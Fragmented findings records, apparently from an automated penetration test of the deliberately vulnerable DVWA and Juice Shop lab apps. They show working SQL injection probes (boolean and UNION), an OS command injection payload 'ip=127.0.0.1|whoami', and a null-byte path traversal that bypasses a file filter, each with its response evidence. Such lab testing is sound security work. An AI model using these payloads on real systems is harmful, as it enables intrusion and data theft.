GET http://dvwa/vulnerabilities/sqli/?id=1' AND '1'='2&Submit=Submit (session dvwa_admin, security=low) -> FALSE

FALSE payload (id=1' AND '1'='2) returned HTTP 200 with 'User ID:' and zero records (no First name/Surname rows). Surnames recorded: admin, Brown, Me, Picasso, Smith. SQLi DB: mysql.

findings.title: SQL injection in product search q parameter (SQLite error + UNION)
request_sequence: GET /rest/products/search?q=qwert' (unauth) -> 500, body: 'Error: SQLITE_ERROR: near "'%'": syntax error'
findings.response_evidence: Benign baseline q=apple: 200, status=success, real product rows (Apple Juice, Apple Pomace). Quote probe q=qwert': HTTP 500 with 'Error: SQLITE_ERROR: near "'%'": syntax error' (raw SQL error leaked). UNION probe q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--: HTTP 200 with data=[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}], i.e. attacker-chosen values reflected in the product columns, proving UNION injection into the query.

This is the same distinct seeded item and quantity (Apple Juice (1000ml), qty 3) owned by acct1, so object-level authorization is missing.

findings.title: Unauthenticated /api/Feedbacks returns feedback with only partially masked author emails
findings.response_evidence: HTTP 200 application/json, no auth required, 8 records (UserId,id,comment,rating,createdAt,updatedAt). Author emails appear only masked inside comments: \"(***in@juice-sh.op)\", \"(***@juice-sh.op)\", \"(***der@juice-sh.op)\", \"(***ereum@juice-sh.op)\"; remaining entries are anonymous (UserId null). Unauthenticated access confirmed, but full author email addresses are not disclosed, so the PII criterion is not met. Also note: the UserId field is exposed, so the author can be linked to a user ID. Recommend the Coordinator decide whether partial masking qualifies as CWE-359.

POST http://dvwa/vulnerabilities/sqli/ session=dvwa_admin form: id=1 AND 1=2&Submit=Submit (FALSE)
findings.response_evidence: [security=medium] TRUE (id=1 OR 1=1): HTTP 200, 5 records returned with surnames: "First name: admin Surname: admin", "First name: Gordon Surname: Brown", "First name: Hack Surname: Me", "First name: Pablo Surname: Picasso", "First name: Bob Surname: Smith". findings.title: Poison null-byte path traversal bypasses /ftp/ file-type filter to retrieve restricted package.json.bak
findings.response_evidence: Raw path: HTTP 403, body 'Error: Only .md and .pdf files are allowed!' (Express fileServer.js verify). Null-byte bypass: HTTP 200, content-type application/octet-stream, body begins with package.json content: '{ "name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}'. Both behaviors shown: the filter blocks the raw .bak file and the %2500.md suffix returns the restricted backup file contents.

findings.title: DVWA OS Command Injection via ip parameter [security=high]
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> 'Security level is currently: high'
findings.response_evidence: [security=high] Payload ip=127.0.0.1|whoami (pipe, no trailing space; no ';', '| ' or '&&'). HTTP 200. Response body under 'Ping a device' contains the output line 'www-data' (the web-process identity). Page footer: 'Security Level: high'. Note: the harness session_info field reported security_level 'low', but the DVWA security.php page and exec page both state the level is high, so the page text was used as authoritative.

findings.title: DVWA SQL Injection via session-input id -> /vulnerabilities/sqli/ [security=high]
findings.response_evidence: [security=high] TRUE payload id=1' OR '1'='1' # returned 5 user records on /vulnerabilities/sqli/: surnames admin, Brown (Gordon), Me (Hack), Picasso (Pablo), Smith (Bob). FALSE payload id=1' AND '1'='2' # returned zero records (only 'Click here to change your ID' and footer, no 'ID:/First name:/Surname:' rows). Injection is through the out-of-band session value consumed by the sqli page. Note: harness session_info reported security_level 'low', but the page footer and security.php both state Security Level: high, so high was used as authoritative.

findings.title: Unauthenticated User-Feedback PII Exposure via GET /api/Feedbacks
findings.response_evidence: Unauthenticated request returned HTTP 200 with {"status":"success","data":[...]} containing 8 feedback records. Each record has only UserId, id, comment, rating, createdAt, updatedAt; there is no author email field. The only email-like content is inside comment text and is partially masked: "(***in@juice-sh.op)" (UserId 1), "(***@juice-sh.op)" (UserId 2), "(***der@juice-sh.op)" (UserId 3), "(***ereum@juice-sh.op)" (UserId 21). Anonymous records have UserId null and "(anonymous)". No full author email address is disclosed, so the stated criterion (disclosure of author email addresses) is not met. The endpoint does expose unauthenticated author linkage (UserId values) and masked email fragments, which is a possible low-severity information leak worth noting, but it is not confirmed as full PII disclosure.

findings.title: Unauthenticated User-Feedback PII Exposure on GET /api/Feedbacks (not reproduced)
findings.response_evidence: HTTP 200, application/json, {"status":"success","data":[8 records]}. Each record has only UserId, id, comment, rating, createdAt, updatedAt; no author email field. Only email-like strings are inside comment text and are masked: "(***in@juice-sh.op)", "(***@juice-sh.op)", "(***der@juice-sh.op)", "(***ereum@juice-sh.op)". Anonymous records have UserId null and "(anonymous)". No full author email address is disclosed without authentication. Criterion 'discloses author email addresses (PII)' is not met. Residual note: masked fragments leak partial local-part characters, which is at most a minor CWE-200 concern and not the assigned CWE-359 finding.
